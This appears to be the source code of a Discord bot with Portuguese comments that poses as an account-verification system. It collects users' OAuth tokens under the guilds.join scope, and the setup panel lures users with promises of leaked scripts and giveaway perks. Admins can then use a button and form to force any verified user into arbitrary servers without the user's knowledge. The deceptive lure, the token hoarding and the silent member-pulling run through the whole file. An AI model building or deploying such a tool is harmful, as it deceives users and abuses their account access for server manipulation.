require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, PermissionsBitField 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; // Link para onde o usuário volta

const app = express();
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const userTokens = new Map();

// --- SERVIDOR WEB ---
app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('Erro: Falta o código.');

    try {
        // 1. Troca Código por Token
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;

        // 2. Pega dados do Usuário
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // 3. Salva Token na Memória
        userTokens.set(user.id, access_token);

        // 4. Envia LOG para o Admin
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embedLog = new EmbedBuilder()
                .setTitle('📥 Novo Usuário Autorizado')
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .addFields(
                    { name: 'Usuário', value: `${user.username} (${user.id})`, inline: true },
                    { name: 'Status', value: '🟢 Token Salvo', inline: true }
                )
                .setColor(0x00FF00)
                .setFooter({ text: 'Aguardando envio...' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`btn_abrir_envio_${user.id}`)
                    .setLabel('Enviar para um Servidor')
                    .setStyle(ButtonStyle.Primary)
                    .setEmoji('✈️')
            );

            await logChannel.send({ embeds: [embedLog], components: [row] });
        }

        // 5. RESPOSTA VISUAL BONITA (HTML/CSS)
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificado com Sucesso</title>
                <style>
                    body {
                        background-color: #2b2d31; /* Cor de fundo do Discord */
                        font-family: 'gg sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        color: white;
                        display: flex;
                        justify_content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        flex-direction: column;
                    }
                    .card {
                        background-color: #313338;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                        text-align: center;
                        max-width: 400px;
                        width: 90%;
                    }
                    .icon {
                        font-size: 60px;
                        color: #23a559; /* Verde Discord */
                        margin-bottom: 20px;
                    }
                    h1 { margin: 0 0 10px 0; font-size: 24px; }
                    p { color: #b5bac1; margin-bottom: 30px; }
                    .btn {
                        background-color: #5865F2; /* Blurple Discord */
                        color: white;
                        padding: 12px 24px;
                        text-decoration: none;
                        border-radius: 5px;
                        font-weight: bold;
                        transition: background 0.2s;
                        display: inline-block;
                    }
                    .btn:hover { background-color: #4752c4; }
                    .timer { margin-top: 20px; font-size: 12px; color: #949ba4; }
                </style>
            </head>
            <body>
                <div class="card">
                    <div class="icon">✅</div>
                    <h1>Verificado!</h1>
                    <p>Sua conta foi autenticada com sucesso. Você já pode fechar esta janela.</p>
                    
                    <a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a>
                    
                    <div class="timer">Redirecionando automaticamente em <span id="count">3</span>s...</div>
                </div>

                <script>
                    let seconds = 3;
                    const countSpan = document.getElementById('count');
                    
                    const interval = setInterval(() => {
                        seconds--;
                        countSpan.innerText = seconds;
                        if (seconds <= 0) {
                            clearInterval(interval);
                            window.location.href = "${REDIRECT_TARGET}";
                        }
                    }, 1000);
                </script>
            </body>
            </html>
        `);

    } catch (error) {
        console.error(error);
        res.send('<h1 style="color:red; text-align:center; font-family: sans-serif; margin-top: 50px;">❌ Erro na verificação.</h1>');
    }
});

app.listen(process.env.PORT || 3000);

// --- BOT DISCORD ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    
    const guildId = process.env.MAIN_GUILD;
    if(guildId) {
        const guild = client.guilds.cache.get(guildId);
        if(guild) {
            await guild.commands.set([{
                name: 'setup_auth',
                description: 'Cria o painel de verificação'
            }]);
        }
    }
});

client.on('interactionCreate', async interaction => {
    
    // --- 1. COMANDO SETUP (SEM IMAGEM) ---
    if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('🔓 Liberação de Acesso')
            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para vereficar sua conta.')
            .setColor(0x5865F2)
            // A linha .setImage(...) foi removida daqui
            .setFooter({ text: 'Sistema Seguro de Verificação' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Verificar Agora')
                .setStyle(ButtonStyle.Link)
                .setURL(authUrl)
                .setEmoji('✅')
        );

        await interaction.channel.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: 'Painel criado!', ephemeral: true });
    }

    // --- 2. ADMIN ENVIA O USUÁRIO ---
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
        const targetUserId = interaction.customId.split('_')[3];

        const modal = new ModalBuilder()
            .setCustomId(`modal_envio_${targetUserId}`)
            .setTitle('Enviar Usuário');

        const serverIdInput = new TextInputBuilder()
            .setCustomId('input_server_id')
            .setLabel("ID do Servidor Alvo")
            .setPlaceholder("O BOT DEVE ESTAR LÁ")
            .setStyle(TextInputStyle.Short);

        modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
        const targetUserId = interaction.customId.split('_')[2];
        const targetServerId = interaction.fields.getTextInputValue('input_server_id');

        await interaction.deferReply({ ephemeral: true });

        const accessToken = userTokens.get(targetUserId);

        if (!accessToken) {
            return interaction.editReply('❌ **Erro:** O token desse usuário expirou (bot reiniciou).');
        }

        try {
            await axios.put(
                `https://discord.com/api/guilds/${targetServerId}/members/${targetUserId}`,
                { access_token: accessToken },
                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
            );
            await interaction.editReply(`✅ **Sucesso!** Usuário enviado para o servidor \`${targetServerId}\`.`);
        } catch (erro) {
            console.error(erro);
            await interaction.editReply('❌ Falha ao adicionar. Verifique se o bot está no servidor alvo e tem permissão.');
        }
    }
});

client.login(process.env.BOT_TOKEN);
